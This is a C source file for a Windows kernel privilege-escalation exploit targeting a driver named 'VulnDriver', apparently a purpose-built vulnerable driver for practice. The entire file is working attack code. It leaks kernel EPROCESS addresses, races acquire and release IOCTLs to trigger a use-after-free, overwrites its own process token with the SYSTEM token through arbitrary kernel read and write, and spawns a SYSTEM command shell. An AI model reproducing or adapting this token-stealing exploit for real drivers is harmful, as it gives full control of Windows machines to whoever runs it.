#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>


#define IOCTL_ACQUIRE           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_RELEASE           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BUFFER      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_BUFFER       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_REINIT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LEAK_BUFFER_ADDR  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_ABSOLUTE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_ABSOLUTE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)


#define BUFFER_SIZE     256
#define TOKEN_OFFSET    0x4B8   // EPROCESS.Token on Win10/11 22H2 x64


typedef struct _WRITE_ABSOLUTE_INPUT {
    ULONG64 KernelAddr;
    ULONG   Size;
    UCHAR   Data[8];
} WRITE_ABSOLUTE_INPUT, * PWRITE_ABSOLUTE_INPUT;

typedef struct _RACE_CONTEXT {
    HANDLE          hDriver;
    volatile LONG   go;
    volatile LONG   stop;
} RACE_CONTEXT, * PRACE_CONTEXT;



typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG       ProcessId;
    BYTE        ObjectTypeNumber;
    BYTE        Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY, * PSYSTEM_HANDLE_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG               HandleCount;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

#define SystemHandleInformation 16

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);



BOOL IsRunningAsAdmin(VOID)
{
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

BOOL EnableDebugPrivilege(VOID)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

ULONG64 LeakEPROCESS(DWORD targetPid)
{
    PNtQuerySystemInformation pNtQSI = (PNtQuerySystemInformation)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!pNtQSI) return 0;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess)
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
    if (!hProcess) return 0;

    ULONG bufSize = 1024 * 1024;
    PSYSTEM_HANDLE_INFORMATION pInfo = NULL;
    NTSTATUS status;

    do {
        if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo);
        pInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), 0, bufSize);
        status = pNtQSI(SystemHandleInformation, pInfo, bufSize, NULL);
        bufSize *= 2;
    } while (status == 0xC0000004);

    ULONG64 addr = 0;
    DWORD myPid = GetCurrentProcessId();

    if (NT_SUCCESS(status)) {
        for (ULONG i = 0; i < pInfo->HandleCount; i++) {
            if (pInfo->Handles[i].ProcessId == myPid &&
                (HANDLE)(ULONG_PTR)pInfo->Handles[i].Handle == hProcess)
            {
                addr = (ULONG64)pInfo->Handles[i].Object;
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, pInfo);
    CloseHandle(hProcess);
    return addr;
}

BOOL IsSystem(VOID)
{
    HANDLE hToken;
    UCHAR buf[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    DWORD len;
    BOOL result = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    if (GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &len)) {
        PSID systemSid;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
            0, 0, 0, 0, 0, 0, 0, &systemSid);
        result = EqualSid(((PTOKEN_USER)buf)->User.Sid, systemSid);
        FreeSid(systemSid);
    }
    CloseHandle(hToken);
    return result;
}


BOOL ReadAbsolute(HANDLE hDriver, ULONG64 addr, ULONG64* out)
{
    struct { ULONG64 addr; ULONG size; } input = { addr, 8 };
    DWORD br;
    return DeviceIoControl(hDriver, IOCTL_READ_ABSOLUTE,
        &input, sizeof(input), out, sizeof(ULONG64), &br, NULL);
}

BOOL WriteAbsolute(HANDLE hDriver, ULONG64 addr, ULONG64 value)
{
    WRITE_ABSOLUTE_INPUT wa = { 0 };
    wa.KernelAddr = addr;
    wa.Size = 8;
    memcpy(wa.Data, &value, 8);
    DWORD br;
    return DeviceIoControl(hDriver, IOCTL_WRITE_ABSOLUTE,
        &wa, sizeof(wa), NULL, 0, &br, NULL);
}

// ─────────────────────────────────────────────────────────────────────────────
// Race Condition threads
//
// Strategy: both threads loop until main thread sets 'stop' after 500ms.
// This is enough time for the race to trigger the free, but prevents
// threads from hammering IOCTLs after object destruction (avoids BSOD).
// ─────────────────────────────────────────────────────────────────────────────

DWORD WINAPI ThreadAcquire(LPVOID param)
{
    PRACE_CONTEXT ctx = (PRACE_CONTEXT)param;
    DWORD br;

    while (InterlockedCompareExchange(&ctx->go, 1, 1) == 0)
        _mm_pause();

    while (InterlockedCompareExchange(&ctx->stop, 1, 1) == 0) {
        DeviceIoControl(ctx->hDriver, IOCTL_ACQUIRE,
            NULL, 0, NULL, 0, &br, NULL);
    }
    return 0;
}

DWORD WINAPI ThreadRelease(LPVOID param)
{
    PRACE_CONTEXT ctx = (PRACE_CONTEXT)param;
    DWORD br;

    while (InterlockedCompareExchange(&ctx->go, 1, 1) == 0)
        _mm_pause();

    while (InterlockedCompareExchange(&ctx->stop, 1, 1) == 0) {
        DeviceIoControl(ctx->hDriver, IOCTL_RELEASE,
            NULL, 0, NULL, 0, &br, NULL);
    }
    return 0;
}


int main(VOID)
{

    if (!IsRunningAsAdmin()) {
        printf("[!] Must run as Administrator\n");
        return 1;
    }
    printf("[+] Running as Administrator\n");

    if (!EnableDebugPrivilege()) {
        printf("[!] Failed to enable SeDebugPrivilege\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    HANDLE hDriver = CreateFileA("\\\\.\\VulnDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open driver (err=%d)\n", GetLastError());
        return 1;
    }
    printf("[+] Driver handle: %p\n", hDriver);

    if (IsSystem()) {
        printf("[!] Already SYSTEM — nothing to do\n");
        CloseHandle(hDriver);
        return 0;
    }
    printf("[*] Current privilege: USER (PID: %d)\n", GetCurrentProcessId());

    // ── Phase 1: Leak EPROCESS addresses ────────────────────────────────────

    printf("[*] Leak EPROCESS addresses.\n");

    ULONG64 eprocSystem = LeakEPROCESS(4);
    ULONG64 eprocMine = LeakEPROCESS(GetCurrentProcessId());

    if (!eprocSystem || !eprocMine) {
        printf("[!] Failed to leak EPROCESS\n");
        CloseHandle(hDriver);
        return 1;
    }

    ULONG64 tokenAddrSystem = eprocSystem + TOKEN_OFFSET;
    ULONG64 tokenAddrMine = eprocMine + TOKEN_OFFSET;

    printf("[+] EPROCESS[SYSTEM]  = 0x%llx\n", eprocSystem);
    printf("[+] EPROCESS[mine]    = 0x%llx\n", eprocMine);
    printf("[+] Token[SYSTEM] at  = 0x%llx\n", tokenAddrSystem);
    printf("[+] Token[mine]   at  = 0x%llx\n", tokenAddrMine);

    // ── Phase 2: Race Condition ─────────────────────────────────────────────

    printf("[*] Race Condition — Acquire vs Release on separate CPUs.\n");

    RACE_CONTEXT ctx = { 0 };
    ctx.hDriver = hDriver;

    HANDLE hT1 = CreateThread(NULL, 0, ThreadAcquire, &ctx, CREATE_SUSPENDED, NULL);
    HANDLE hT2 = CreateThread(NULL, 0, ThreadRelease, &ctx, CREATE_SUSPENDED, NULL);

    SetThreadAffinityMask(hT1, 0x1);
    SetThreadAffinityMask(hT2, 0x2);
    SetThreadPriority(hT1, THREAD_PRIORITY_HIGHEST);
    SetThreadPriority(hT2, THREAD_PRIORITY_HIGHEST);

    printf("[*] Thread Acquire pinned to CPU 0\n");
    printf("[*] Thread Release pinned to CPU 1\n");

    ResumeThread(hT1);
    ResumeThread(hT2);
    Sleep(50);

    printf("[*] Racing...\n");
    InterlockedExchange(&ctx.go, 1);

    // Race for 500ms then stop both threads
    Sleep(500);
    InterlockedExchange(&ctx.stop, 1);

    WaitForSingleObject(hT1, 3000);
    WaitForSingleObject(hT2, 3000);
    CloseHandle(hT1);
    CloseHandle(hT2);

    printf("[+] Race complete. Object should be freed by now.\n");

    // ── Phase 3: Reinitialize object ────────────────────────────────────────

    printf("[*] IOCTL_REINIT to restore driver object.\n");

    DWORD br;
    BOOL ok = DeviceIoControl(hDriver, IOCTL_REINIT,
        NULL, 0, NULL, 0, &br, NULL);
    printf("[%c] IOCTL_REINIT: %s\n", ok ? '+' : '!',
        ok ? "object restored" : "failed (may already exist)");

    // ── Phase 4: Read SYSTEM token ──────────────────────────────────────────

    printf("[*] Read SYSTEM token via READ_ABSOLUTE.");

    ULONG64 systemToken = 0;
    if (!ReadAbsolute(hDriver, tokenAddrSystem, &systemToken)) {
        printf("[!] ReadAbsolute failed\n");
        CloseHandle(hDriver);
        return 1;
    }
    printf("[+] SYSTEM token (EX_FAST_REF): 0x%llx\n", systemToken);

    ULONG64 myToken = 0;
    ReadAbsolute(hDriver, tokenAddrMine, &myToken);
    printf("[+] Our token    (EX_FAST_REF): 0x%llx\n", myToken);

    // ── Phase 5: Token Stealing ─────────────────────────────────────────────

    printf("[*] WRITE_ABSOLUTE — overwrite our token with SYSTEM token.");

    printf("[*] Target: 0x%llx\n", tokenAddrMine);
    printf("[*] Value:  0x%llx\n", systemToken);

    if (!WriteAbsolute(hDriver, tokenAddrMine, systemToken)) {
        printf("[!] WriteAbsolute failed\n");
        CloseHandle(hDriver);
        return 1;
    }

    printf("[+] Token overwritten!\n");

    // ── Phase 6: Verify ─────────────────────────────────────────────────────

    if (IsSystem()) {
        printf("[!] LPE SUCCESSFUL | WE GOT SYSTEM ^_~");

        printf("[*] Spawning cmd.exe as SYSTEM...\n");
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (CreateProcessA(NULL, "cmd.exe", NULL, NULL,
            FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        {
            printf("[+] cmd.exe started (PID: %d)\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    else {
        printf("[-] Still USER — race may not have triggered correctly\n");
        printf("[-] Try running again\n");
    }

    CloseHandle(hDriver);
    printf("\n[*] Done.\n");
    return 0;
}